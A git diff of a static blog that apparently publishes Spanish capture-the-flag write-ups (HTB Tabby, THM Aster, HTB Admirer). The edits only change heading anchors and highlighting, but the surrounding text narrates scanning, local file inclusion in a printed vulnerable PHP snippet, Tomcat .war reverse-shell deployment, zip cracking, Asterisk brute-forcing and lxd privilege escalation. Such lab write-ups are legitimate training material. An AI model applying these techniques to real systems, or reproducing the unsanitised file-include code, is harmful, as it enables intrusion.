@@ -74,7 +74,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http tomcat (8080), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -138,10 +138,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Sep 24 01:06:41 2020 -- 1 IP address (1 host up) scanned in 15.55 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80 que ofrece servicios de hosting.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -169,7 +169,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Las direcciones que encontramos no tienen algo que nos pudiera ayudar pero, al revisar el codigo fuente de la pagina principal vemos que el boton &lt;code&gt;News&lt;/code&gt; en el nav, nos redirige hacia otra pagina con el dominio &lt;code&gt;megahosting.htb&lt;/code&gt; el cual agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt; a la IP de la maquina. Regresamos nuevamente a la pagina y vemos que la URL se le pasa un archivo (&lt;code&gt;?file=statement&lt;/code&gt;), posiblemente tenga una vulnerabilidad de LFI.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;dotdotpwn---lfi&#34;&gt;DOTDOTPWN - LFI&lt;/h2&gt;
+&lt;h2 id=&#34;dotdotpwn---lfi-&#34;&gt;DOTDOTPWN - LFI&lt;/h2&gt;
 &lt;p&gt;Utilizamos la herramienta dotdotpwn la cual nos ayudo a identificar la vulnerabilidad LFI en la pagina.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -312,18 +312,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:news.php&#34; data-lang=&#34;php:news.php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:news.php&#34; data-lang=&#34;php:news.php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
 &lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;files/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;nx&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Realizamos una busqueda de archivos conocidos de linux por posibles contraseñas o configuraciones para ingresar pero no encontramos nada.&lt;/p&gt;
-&lt;h2 id=&#34;http---puerto-8080&#34;&gt;HTTP - PUERTO 8080&lt;/h2&gt;
+&lt;h2 id=&#34;http---puerto-8080-&#34;&gt;HTTP - PUERTO 8080&lt;/h2&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 8080 en Apache Tomcat, donde vemos un mensaje que indica que Tomcat se instalo satisfactoriamente y muestran algunas direcciones de la maquina, pero lo interesante es la nota que dejan.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_5.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Indica que los usuarios estan &amp;ldquo;definidos&amp;rdquo; en la direccion &lt;code&gt;/etc/tomcat9/tomcat-users.xml&lt;/code&gt;.&lt;/p&gt;
@@ -434,7 +434,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_6.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Intentamos en &lt;code&gt;/host-manager/html&lt;/code&gt; donde logramos ingresar, mas no logramos hacer nada.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_7.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;tomcat---user&#34;&gt;TOMCAT - USER&lt;/h2&gt;
+&lt;h2 id=&#34;tomcat---user-&#34;&gt;TOMCAT - USER&lt;/h2&gt;
 &lt;p&gt;Intentamos utilizar el exploit &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload&#34;&gt;&lt;strong&gt;tomcat_mgr_upload&lt;/strong&gt;&lt;/a&gt; de metasploit pero este mostraba errores ya que la pagina &lt;code&gt;/manager&lt;/code&gt; esta &amp;ldquo;desactivada&amp;rdquo;, exploramos otras opciones y encontramos &lt;a href=&#34;https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/&#34;&gt;&lt;strong&gt;Tomcat exploit variant : host-manager&lt;/strong&gt;&lt;/a&gt; pero este solo funciona en maquinas Windows. Investigamos un poco sobre como se sube estos archivos (.war) y encontramos que es posible subir estos mediante &lt;a href=&#34;https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script&#34;&gt;&lt;code&gt;curl&lt;/code&gt;&lt;/a&gt; utilizando las credenciales y un archivo &lt;code&gt;.war&lt;/code&gt; sin necesidad de acceder al GUI de la aplicacion.&lt;/p&gt;
 &lt;p&gt;Para ello vamos a tener que crear un payload como en la maquina &lt;a href=&#34;https://sckull.github.io/posts/thompson/#reverse-shell---jsp&#34;&gt;&lt;strong&gt;THM/BSIDESGT - THOMPSON&lt;/strong&gt;&lt;/a&gt; y poner a la escucha metasploit:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -465,7 +465,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario &lt;code&gt;tomcat&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_8.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;ash---user&#34;&gt;ASH - USER&lt;/h2&gt;
+&lt;h2 id=&#34;ash---user-&#34;&gt;ASH - USER&lt;/h2&gt;
 &lt;p&gt;En el directorio &lt;code&gt;/var/www/html/files&lt;/code&gt; encontramos un archivo zip el cual esta protegido con contraseña, utilizamos &lt;code&gt;fcrackzip&lt;/code&gt; para obtener la contraseña y el contenido de este archivo.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -540,7 +540,7 @@ kali@kali:~/htb/tabby$
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Utilizamos la contraseña del archivo comprimido que encontramos con el usuario &lt;code&gt;ash&lt;/code&gt; en la maquina y logramos obtener una shell con este usuario y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/tabby/Screenshot_9.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;id&lt;/code&gt; y vemos que el usuario pertenece al grupo de &lt;code&gt;lxd&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -746,7 +746,7 @@ root
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), h323q931(?) (1720), cisco-sccp (2000), asterisk (5038) y el puerto ssh (22) abiertos entre otros de los cuales no logramos obtener mucha informacion.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -908,7 +908,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 15:58:42 2020 -- 1 IP address (1 host up) scanned in 62.78 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80 en la que nos da un script en python.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_154029.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -985,7 +985,7 @@ kali@kali:~/thm/aster$
 476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21: Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos pero no encontramos más que solo los archivos estaticos de la pagina.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1005,7 +1005,7 @@ kali@kali:~/thm/aster$
 /server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;asterisk&#34;&gt;ASTERISK&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;asterisk-&#34;&gt;ASTERISK&lt;/h2&gt;
 &lt;p&gt;Entre los puertos que encontramos se encuentra &lt;code&gt;Asterisk Call Manager 5.0.2&lt;/code&gt; el cual permite que un usuario se conecte a este puerto y ejecute comandos o lea eventos. Al investigar sobre este &amp;ldquo;servicio/server&amp;rdquo; encontramos un post donde realizan un &lt;a href=&#34;https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/&#34;&gt;&lt;strong&gt;&amp;lsquo;Pentesting&amp;rsquo;&lt;/strong&gt;&lt;/a&gt; a este servicio, primero utilizamos el modulo de metasploit &lt;code&gt;use auxiliary/voip/asterisk_login&lt;/code&gt; el cual realiza un ataque de fuerza bruta, conociendo un nombre de usuario (admin) y utilizando los wordlist que vienen por defecto ejecutamos el modulo. Logrando encontrar la &amp;ldquo;contraseña&amp;rdquo; de este usuario.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1150,7 +1150,7 @@ LastReload: &lt;span class=&#34;m&#34;&gt;5368&lt;/span&gt;
 Status: Fully Booted
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;harry---user&#34;&gt;HARRY - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;harry---user-&#34;&gt;HARRY - USER&lt;/h2&gt;
 &lt;p&gt;Enumeramos informacion SIP el cual contiene usuarios, &amp;ldquo;contraseñas&amp;rdquo; (secrets) y extensiones. Vemos que tenemos la &amp;ldquo;contraseña&amp;rdquo; del usuario harry, utilizamos esta en el servicio SSH y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1177,7 +1177,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_180452.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;root-flag&#34;&gt;ROOT FLAG&lt;/h2&gt;
+&lt;h2 id=&#34;root-flag-&#34;&gt;ROOT FLAG&lt;/h2&gt;
 &lt;p&gt;Dentro de la carpeta de &lt;code&gt;harry&lt;/code&gt; encontramos el archivo &lt;strong&gt;Example_Root.jar&lt;/strong&gt; el cual decompilamos utilizando &lt;a href=&#34;http://www.javadecompilers.com/&#34;&gt;&lt;strong&gt;JavaDecompilers&lt;/strong&gt;&lt;/a&gt; y encontramos que el codigo valida que el archivo &lt;code&gt;/tmp/flag.dat&lt;/code&gt; existe, en tal caso escribe dentro de del archivo &lt;code&gt;/home/harry/root.txt&lt;/code&gt; la cadena &lt;code&gt;my secret &amp;lt;3 baby&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1285,7 +1285,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
 &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt; 6	* * 7	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;m&#34;&gt;52&lt;/span&gt; 6	&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; * *	root	&lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; -x /usr/sbin/anacron &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; / &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 *  *	* * *	root	&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root/java/ &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash run.sh
-&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
+#
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;El primero ejecuta &lt;code&gt;ufw&lt;/code&gt;, el segundo al parecer &lt;em&gt;ejecuta algun archivo java&lt;/em&gt;.&lt;/p&gt;
@@ -1420,7 +1420,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1492,10 +1492,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Sep 14 17:54:44 2020 -- 1 IP address (1 host up) scanned in 15.78 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/admirer/Screenshot_20200914_155738.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1694,7 +1694,7 @@ Disallow: /admin-dir
     codetabContents[0].style.display = &#39;block&#39;;
   }
 &lt;/script&gt;
-&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
 &lt;p&gt;Utilizamos las credenciales en el servicio FTP, en donde encontramos dos archivos html.tar.gz y dump.sql.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1853,13 +1853,13 @@ drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; kali kali 4.0K Dec  &lt;
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:admin_tasks.php&#34; data-lang=&#34;php:admin_tasks.php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Administrative&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Tasks&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;h3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Admin&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Tasks&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Web&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Interface&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;01&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;beta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;h3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:admin_tasks.php&#34; data-lang=&#34;php:admin_tasks.php&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Administrative Tasks&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Admin Tasks Web Interface (v0.01 beta)&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;h3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;// Web Interface to the admin_tasks script
 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 
 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;task&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
@@ -1889,26 +1889,26 @@ drwxr-x--- &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; kali kali 4.0K Dec  &lt;
